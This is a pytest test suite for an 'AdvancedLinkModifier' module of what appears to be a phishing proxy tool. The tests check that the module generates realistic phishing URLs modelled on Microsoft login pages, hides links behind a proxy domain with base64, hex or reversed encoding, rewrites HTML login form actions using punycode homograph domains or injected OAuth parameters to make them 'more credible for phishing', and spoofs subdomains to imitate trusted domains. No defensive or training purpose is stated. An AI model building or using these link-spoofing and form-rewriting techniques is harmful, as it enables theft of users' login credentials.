"""
Tests for the Advanced Link Modifier functionality
"""

import pytest
from core.proxy.advanced_link_modifier import AdvancedLinkModifier


class TestAdvancedLinkModifier:
    
    @pytest.fixture
    def modifier(self):
        return AdvancedLinkModifier()
    
    def test_generate_realistic_phishing_url_basic(self, modifier):
        """Test basic phishing URL generation"""
        original_url = "https://login.microsoftonline.com/common/oauth2/authorize"
        campaign_id = "test-campaign-123"
        
        phishing_url = modifier.generate_realistic_phishing_url(original_url, campaign_id)
        
        # Should be different from original
        assert phishing_url != original_url
        # Should still be a valid URL
        assert phishing_url.startswith('https://')
        # Should contain elements from original
        assert 'microsoftonline' in phishing_url or 'login' in phishing_url
    
    def test_obfuscate_url_base64(self, modifier):
        """Test URL obfuscation with base64"""
        original_url = "https://example.com/login"
        
        obfuscated = modifier.obfuscate_url(original_url, 'base64')
        
        assert obfuscated != original_url
        assert obfuscated.startswith('https://vantablack-proxy.com/decode/')
        assert len(obfuscated) > len(original_url)
    
    def test_obfuscate_url_hex(self, modifier):
        """Test URL obfuscation with hex encoding"""
        original_url = "https://example.com/login"
        
        obfuscated = modifier.obfuscate_url(original_url, 'hex')
        
        assert obfuscated != original_url
        assert obfuscated.startswith('https://vantablack-proxy.com/h/')
        # Hex encoding should be longer
        assert len(obfuscated) > len(original_url)
    
    def test_obfuscate_url_reverse(self, modifier):
        """Test URL obfuscation with reversal"""
        original_url = "https://example.com/login"
        
        obfuscated = modifier.obfuscate_url(original_url, 'reverse')
        
        assert obfuscated != original_url
        assert obfuscated.startswith('https://vantablack-proxy.com/rev/')
    
    def test_contextual_rewrite_html_auth(self, modifier):
        """Test contextual rewriting for HTML authentication content"""
        html_content = """
        <html>
        <body>
            <form action="https://login.microsoft.com/login" method="post">
                <input type="text" name="username">
                <input type="password" name="password">
            </form>
        </body>
        </html>
        """
        
        context = {
            'content_type': 'html',
            'campaign_id': 'test-campaign'
        }
        
        rewritten = modifier.contextual_rewrite(html_content, "https://example.com", context)
        
        # Should have rewritten the form action (either homograph attack or parameter injection)
        # The URL should be modified to make it more credible for phishing
        
        # Check if homograph attack was used (domain replaced with punycode)
        homograph_used = 'xn--' in rewritten
        
        # Check if parameter injection was used (OAuth parameters added)
        parameter_injection_used = ('client_id=' in rewritten and 'response_type=' in rewritten and 
                                  'state=' in rewritten)
        
        # At least one technique should have been applied
        assert homograph_used or parameter_injection_used, \
            "No advanced modification technique was applied to the URL"
        
        # Should preserve the login functionality
        assert '/login' in rewritten
        # Should contain the form structure intact
        assert 'form action=' in rewritten and 'method="post"' in rewritten
        # Should look like a Microsoft login page
        assert 'microsoft' in rewritten.lower() or 'login' in rewritten.lower()
    
    def test_generate_realistic_oauth_params(self, modifier):
        """Test generation of realistic OAuth parameters"""
        campaign_id = "test-campaign-456"
        
        params = modifier._generate_realistic_oauth_params(campaign_id)
        
        # Should contain standard OAuth parameters
        assert 'client_id' in params
        assert 'response_type' in params
        assert 'scope' in params
        assert 'state' in params
        assert 'redirect_uri' in params
        
        # Parameters should have realistic values
        assert params['client_id'].count('-') >= 4  # UUID-like format
        assert params['state']  # Should not be empty
        assert 'vantablack-proxy.com' in params['redirect_uri']
    
    def test_technique_subdomain_spoofing(self, modifier):
        """Test subdomain spoofing technique"""
        from urllib.parse import urlparse
        
        original_url = "https://example.com/path"
        parsed = urlparse(original_url)
        campaign_id = "test"
        
        spoofed_url = modifier._technique_subdomain_spoofing(parsed, campaign_id)
        spoofed_parsed = urlparse(spoofed_url)
        
        # Should have a subdomain that looks like a trusted domain
        assert '.' in spoofed_parsed.netloc
        assert spoofed_parsed.netloc != parsed.netloc
        # Should preserve scheme and path
        assert spoofed_parsed.scheme == parsed.scheme
        assert spoofed_parsed.path == parsed.path
    
    def test_technique_parameter_injection(self, modifier):
        """Test parameter injection technique"""
        from urllib.parse import urlparse, parse_qs
        
        original_url = "https://oauth.example.com/authorize"
        parsed = urlparse(original_url)
        campaign_id = "test"
        
        injected_url = modifier._technique_parameter_injection(parsed, campaign_id)
        injected_parsed = urlparse(injected_url)
        
        # Should have query parameters
        query_params = parse_qs(injected_parsed.query)
        assert len(query_params) > 0
        # Should contain OAuth-like parameters for oauth domains
        assert any(key in query_params for key in ['client_id', 'response_type', 'scope', 'state', 'redirect_uri'])
    
    def test_get_domain_type_detection(self, modifier):
        """Test domain type detection"""
        
        # Microsoft domains
        assert modifier._get_domain_type('login.microsoftonline.com') == 'microsoft'
        assert modifier._get_domain_type('office.com') == 'microsoft'
        
        # Google domains
        assert modifier._get_domain_type('accounts.google.com') == 'google'
        assert modifier._get_domain_type('mail.google.com') == 'google'
        
        # OAuth domains
        assert modifier._get_domain_type('oauth.example.com') == 'oauth'
        assert modifier._get_domain_type('auth.server.com') == 'oauth'
        
        # Generic domains
        assert modifier._get_domain_type('example.com') == 'generic'
        assert modifier._get_domain_type('test.org') == 'generic'


if __name__ == "__main__":
    # Run tests manually for quick verification
    test_instance = TestAdvancedLinkModifier()
    modifier = test_instance.modifier()
    
    # Test basic functionality
    print("Testing basic phishing URL generation...")
    test_instance.test_generate_realistic_phishing_url_basic(modifier)
    print("✓ Basic phishing URL generation passed")
    
    # Test obfuscation
    print("Testing URL obfuscation...")
    test_instance.test_obfuscate_url_base64(modifier)
    print("✓ URL obfuscation passed")
    
    print("All manual tests passed! 🎉")